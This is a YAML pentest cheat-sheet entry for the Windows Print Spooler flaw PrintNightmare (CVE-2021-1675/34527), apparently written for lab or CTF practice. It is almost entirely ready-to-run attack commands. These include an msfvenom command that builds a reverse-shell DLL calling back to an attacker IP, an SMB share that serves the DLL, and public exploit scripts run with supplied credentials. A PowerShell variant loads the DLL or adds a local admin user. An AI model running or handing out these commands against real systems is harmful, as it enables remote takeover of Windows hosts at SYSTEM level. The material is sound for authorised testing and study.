---
description: |
  PrintNightmare (CVE-2021-1675 / CVE-2021-34527) — remote code execution via Windows Print Spooler vulnerability to achieve SYSTEM-level access.
commands:
  - have: Credentials
    cmd: |
      # Check if target is vulnerable — look for MS-RPRN or MS-PAR
      rpcdump.py senshu.sh/sec_user:'P@ssw0rd'@10.10.10.27 | grep -E 'MS-RPRN|MS-PAR'

      # Generate malicious DLL payload
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=9001 -f dll -o evil.dll

      # Host DLL via SMB share on attacker machine
      impacket-smbserver share . -smb2support

      # Exploit — cube0x0 CVE-2021-1675
      python3 CVE-2021-1675.py senshu.sh/sec_user:'P@ssw0rd'@10.10.10.27 '\\10.10.10.21\share\evil.dll'

      # Alternative — calebstewart exploit
      python3 printnightmare.py -u sec_user -p 'P@ssw0rd' -d senshu.sh 10.10.10.27 '\\10.10.10.21\share\evil.dll'
  - have: Shell
    cmd: |
      # PowerShell exploit from inside the network
      Import-Module .\CVE-2021-1675.ps1
      Invoke-Nightmare -DLL "C:\Temp\evil.dll"

      # Add a new local admin user via PrintNightmare
      Import-Module .\CVE-2021-1675.ps1
      Invoke-Nightmare -DriverName "Senshu" -NewUser "sec_user" -NewPassword "P@ssw0rd"
phase:
  - Exploitation
target_os:
  - Windows
services:
  - SMB
techniques:
  - Kernel_Exploit
references:
  - https://github.com/cube0x0/CVE-2021-1675
  - https://github.com/calebstewart/CVE-2021-1675
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printnightmare.html
---
